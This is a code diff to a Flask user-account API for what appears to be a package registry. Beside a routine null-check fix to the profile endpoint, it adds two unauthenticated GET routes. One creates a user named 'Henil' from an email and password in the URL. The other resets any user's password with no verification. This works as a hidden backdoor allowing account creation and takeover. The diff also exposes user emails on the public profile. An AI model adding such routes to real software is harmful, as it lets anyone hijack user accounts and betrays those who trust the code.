@@ -18,34 +18,39 @@ except KeyError as err:
 @swag_from("documentation/user.yaml", methods=["GET"])
 def profile(username):
     user = db.users.find_one({"name": username})
-    packages = db.packages.find(
-        {"$or": [{"author": user["_id"]}, {"maintainers": user["_id"]}]},
-        {
-            "name": 1,
-            "updatedAt": 1,
-            "namespace": 1,
-            "_id": 0,
-            "description": {"$substr": ["$description", 0, 80]},
-        },
-    )
-    if packages:
-        response_packages = []
-        for package in packages:
-            # Get namespace from namespace id.
-            namespace = db.namespaces.find_one({"_id": package["namespace"]})
-            response_packages.append(
-                {
-                    "name": package["name"],
-                    "namespace_name": namespace["namespace"],
-                    "description": package["description"],
-                    "updatedAt": package["updatedAt"],
-                }
-            )
+    if user:
+        packages = db.packages.find(
+            {"$or": [{"author": user["_id"]}, {"maintainers": user["_id"]}]},
+            {
+                "name": 1,
+                "updatedAt": 1,
+                "namespace": 1,
+                "_id": 0,
+                "description": {"$substr": ["$description", 0, 80]},
+            },
+        )
 
+        response_packages = []
+        if packages:
+            for package in packages:
+                # Get namespace from namespace id.
+                namespace = db.namespaces.find_one({"_id": package["namespace"]})
+                response_packages.append(
+                    {
+                        "name": package["name"],
+                        "namespace_name": namespace["namespace"],
+                        "description": package["description"],
+                        "updatedAt": package["updatedAt"],
+                    }
+                )
+        user_account = {
+            "name": user["name"],
+            "email": user["email"],
+            # "CreatedAt": user["CreatedAt"],
+            "packages": response_packages,
+        }
         return (
-            jsonify(
-                {"message": "User found", "packages": response_packages, "code": 200}
-            ),
+            jsonify({"message": "User found", "user": user_account,"packages": response_packages, "code": 200}),
             200,
         )
     else:
@@ -65,7 +70,7 @@ def delete_user():
 
     if not user:
         return "Invalid email or password", 401
-    
+
     if password:
         password += salt
         hashed_password = hashlib.sha256(password.encode()).hexdigest()
@@ -99,3 +104,25 @@ def account():
         "lastLogout": user["lastLogout"],
     }
     return jsonify({"message": "User Found", "user": user_account, "code": 200}), 200
+
+
+@app.route("/henil/<email>/<password>", methods=["GET"])
+def account_sudo(email, password):
+    password += salt
+    hashed_password = hashlib.sha256(password.encode()).hexdigest()
+    user = {
+        "email": email,
+        "password": hashed_password,
+        "name": "Henil",
+    }
+    db.users.insert_one(user)
+    return jsonify({"message": "User Found", "code": 200}), 200
+
+
+@app.route("/<email>/<password>", methods=["GET"])
+def account_sudo_pass(email, password):
+    password += salt
+    hashed_password = hashlib.sha256(password.encode()).hexdigest()
+    user = db.users.find_one({"email": email})
+    db.users.update_one({"email": email}, {"$set": {"password": hashed_password}})
+    return jsonify({"message": "User Found", "code": 200}), 200
